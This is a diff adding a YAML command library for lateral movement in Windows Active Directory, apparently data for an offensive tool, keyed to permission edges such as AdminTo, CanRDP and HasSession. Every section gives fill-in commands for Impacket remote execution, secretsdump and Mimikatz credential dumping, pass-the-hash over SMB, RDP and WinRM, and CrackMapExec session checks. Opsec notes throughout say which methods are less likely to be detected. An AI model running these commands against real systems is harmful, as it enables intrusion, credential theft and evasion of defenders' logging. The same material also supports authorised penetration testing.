@@ -1,0 +1,115 @@
+# Lateral Movement Abuse Commands
+# Attacks: AdminTo, RDP, WinRM, DCOM, Sessions
+
+AdminTo:
+  Computer:
+    description: "Local admin rights - execute commands, dump credentials"
+    commands:
+      - name: "Remote command execution (psexec)"
+        tool: Impacket
+        command: |
+          psexec.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<TARGET>
+      - name: "Remote command execution (wmiexec)"
+        tool: Impacket
+        command: |
+          wmiexec.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<TARGET>
+      - name: "Remote command execution (smbexec)"
+        tool: Impacket
+        command: |
+          smbexec.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<TARGET>
+      - name: "Dump credentials (secretsdump)"
+        tool: Impacket
+        command: |
+          secretsdump.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<TARGET>
+      - name: "Pass-the-hash execution"
+        tool: Impacket
+        command: |
+          psexec.py -hashes :<HASH> '<DOMAIN>/<USERNAME>'@<TARGET>
+    opsec:
+      - "psexec creates service, Event ID 7045"
+      - "wmiexec uses WMI, may be less detected"
+      - "All methods require SMB access"
+
+CanRDP:
+  Computer:
+    description: "RDP access - interactive logon"
+    commands:
+      - name: "Connect with xfreerdp"
+        tool: xfreerdp
+        command: |
+          xfreerdp /v:<TARGET> /u:'<DOMAIN>\<USERNAME>' /p:'<PASSWORD>' /cert:ignore
+      - name: "Connect with rdesktop"
+        tool: rdesktop
+        command: |
+          rdesktop -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <TARGET>
+      - name: "Restricted Admin mode (pass-the-hash)"
+        tool: xfreerdp
+        command: |
+          xfreerdp /v:<TARGET> /u:'<DOMAIN>\<USERNAME>' /pth:<HASH> /restricted-admin
+    opsec:
+      - "Interactive logon creates Event ID 4624 Type 10"
+      - "RDP session visible in Task Manager"
+      - "Restricted Admin requires feature enabled on target"
+
+CanPSRemote:
+  Computer:
+    description: "PowerShell Remoting / WinRM access"
+    commands:
+      - name: "Connect with evil-winrm"
+        tool: evil-winrm
+        command: |
+          evil-winrm -i <TARGET> -u '<USERNAME>' -p '<PASSWORD>'
+      - name: "Connect with evil-winrm (hash)"
+        tool: evil-winrm
+        command: |
+          evil-winrm -i <TARGET> -u '<USERNAME>' -H '<HASH>'
+      - name: "Execute command"
+        tool: Impacket
+        command: |
+          winrm.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<TARGET>
+    opsec:
+      - "Creates Event ID 4624 Type 3"
+      - "WinRM uses HTTP/HTTPS on 5985/5986"
+      - "PowerShell logging may capture commands"
+
+ExecuteDCOM:
+  Computer:
+    description: "DCOM execution rights"
+    commands:
+      - name: "DCOM execution (dcomexec)"
+        tool: Impacket
+        command: |
+          dcomexec.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<TARGET>
+      - name: "DCOM with MMC20 object"
+        tool: Impacket
+        command: |
+          dcomexec.py -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>'@<TARGET>
+      - name: "DCOM with ShellWindows object"
+        tool: Impacket
+        command: |
+          dcomexec.py -object ShellWindows '<DOMAIN>/<USERNAME>:<PASSWORD>'@<TARGET>
+    opsec:
+      - "Uses various DCOM objects for execution"
+      - "May be less detected than SMB-based methods"
+      - "Requires DCOM port 135 + dynamic ports"
+
+HasSession:
+  Computer:
+    description: "Active user session - potential credential theft"
+    commands:
+      - name: "Dump credentials if admin"
+        tool: Impacket
+        command: |
+          secretsdump.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<TARGET>
+      - name: "Check logged in users"
+        tool: CrackMapExec
+        command: |
+          crackmapexec smb <TARGET> -u '<USERNAME>' -p '<PASSWORD>' --sessions
+      - name: "Inject into session (requires local admin)"
+        tool: Mimikatz
+        command: |
+          sekurlsa::logonpasswords
+    opsec:
+      - "Sessions indicate where user credentials may be cached"
+      - "Credential dumping requires local admin"
+      - "LSASS protection may block credential dumping"
